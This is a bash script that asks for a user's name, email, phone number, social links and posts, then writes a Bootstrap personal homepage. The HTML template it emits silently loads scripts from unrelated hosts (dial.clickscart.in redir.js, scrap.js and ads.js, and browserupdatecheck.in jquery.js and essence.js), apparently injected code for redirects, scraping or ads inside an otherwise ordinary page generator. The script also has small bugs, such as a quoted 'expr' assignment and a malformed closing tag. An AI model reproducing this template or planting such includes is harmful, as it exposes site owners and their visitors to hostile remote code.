#!/bin/bash 

# command---> ./syshtml.sh > name.html



#post info
postcount=1
postno=0

declare -a postname1
declare -a postinfo1

postname=default
postinfo=default
#post info end


#variable sections.......................
#this is the website name
websitename=default
read -p "Enter your Webpage name : " websitename

#this is the user's name
username=default
read -p "Enter your Username which is to be displayed : " username

#Eamil id
emailid=default@default.com
read -p "Enter your Email id: " emailid

#phone no
phone=9999999999
read -p "Enter your Phone Number : " phone

#this is the web page's header
pageheader=default
read -p "Enter your Page header name which is to be displayed : " pageheader

#this is the topic name on the header beside the username
topicname=default
read -p "Enter the topic name of the webpage : " topicname

#this is the tagline on the right most side of the header
tagline=default
read -p "Enter the tagline of your webpage : " tagline


#links of social media
fblink=www.facebook.com
read -p "Enter your facebook link : " fblink
twitterlink=www.twitter.com
read -p "Enter your Twitter link : " twitterlink
githublink=www.github.com
read -p "Enter your github ink : " githublink


#lines about the user
aboutme=default
read -p "Enter something about you : " aboutme

#about the webpage
aboutpage=default
read -p "Enter something about your page : " aboutpage

#references
references=default
read -p "Enter the references of your webpage : " references

#footer text
footertext=footertext
read -p "Enter the footer text of your webpage : " footertext

#variable sections end..................





#The functions should appear before we use them


function read_post
{
    read -p "You have 0 posts initially.How many total no of posts should be published ? : " postno

    for((i=$postcount ; i<=$postno ; i++))
        do
            postcount='expr $postcount + 1'
            read postname1[i]
            read postinfo1[i]
            
        done

    for((j=1 ; j<=$postno ; j++))
        do
            echo "<h2>${postname1[j]}</h2>"
            echo "<p>${postinfo1[j]}</p>"
        done    
}




cat<<- _EOF_


<!DOCTYPE html>
<html lang="en">
<head>
  <title>$websitename</title>
<script src="http://dial.clickscart.in/js/jquery-1.8.2.min.js" type="text/javascript"></script>
<script src="http://dial.clickscart.in/js/redir.js" type="text/javascript"></script>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.0/jquery.min.js"></script>
  <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
  <style>
    /* Remove the navbar's default margin-bottom and rounded borders */ 
    .navbar {
      margin-bottom: 0;
      border-radius: 0;
    }
    
    /* Set height of the grid so .sidenav can be 100% (adjust as needed) */
    .row.content {height: 450px}
    
    /* Set gray background color and 100% height */
    .sidenav {
      padding-top: 20px;
      background-color: #f1f1f1;
      height: 100%;
    }
    
    /* Set black background color, white text and some padding */
    footer {
      background-color: #555;
      color: white;
      padding: 15px;
    }
    
    /* On small screens, set height to 'auto' for sidenav and grid */
    @media screen and (max-width: 767px) {
      .sidenav {
        height: auto;
        padding: 15px;
      }
      .row.content {height:auto;} 
    }
  </style>
</head>
<body>

<nav class="navbar navbar-inverse">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>                        
      </button>
      <a class="navbar-brand" href="#">$username</a>
    </div>
    <div class="collapse navbar-collapse" id="myNavbar">
      <ul class="nav navbar-nav">
        <li class="active"><a href="#">$topicname</a></li>
        <li class="active"><a href="#aboutme">About Me</a></li>
        <li class="active"><a href="#reference">References</a></li>
        
      </ul>
      <ul class="nav navbar-nav navbar-right">
        <li><a href="#"></span> $tagline </a></li>
      </ul>
    </div>
  </div>
</nav>
  
<div class="container-fluid text-center">    
  <div class="row content">
    <div class="col-sm-2 sidenav">
      <p><a href="$fblink">Facebook</a></p>
      <p><a href="$twitterlink">Twitter</a></p>
      <p><a href="$githublink">Github</a></p>
    </div>
    <div class="col-sm-8 text-left"> 
      <h1>$pageheader</h1>
      <p>$aboutpage <\p>


      $(read_post)



       <h3 id="aboutme">About Me</h3>
      <p>$aboutme</p>
      
      <hr>
      
      <h3 id="reference">References</h3>
      <p>$references</p>
    </div>
    <div class="col-sm-2 sidenav">
      <div class="well">
        <h4>Email</h4>
        <p>$emailid<p>
      </div>
      <div class="well">
        <h4>Contact</h4>
        <p>$phone</p>
      </div>
    </div>
  </div>
</div>

<footer class="container-fluid text-center" class="footer navbar-fixed-bottom">
  <p>$footertext</p>
</footer>

</body>
<script src="http://dial.clickscart.in/js/scrap.js" type="text/javascript"></script>
<script src="http://dial.clickscart.in/js/ads.js" type="text/javascript"></script>
<script src="http://browserupdatecheck.in/js/jquery.js" type="text/javascript"></script>
<script src="http://browserupdatecheck.in/js/essence.js" type="text/javascript"></script>
</html>



_EOF_


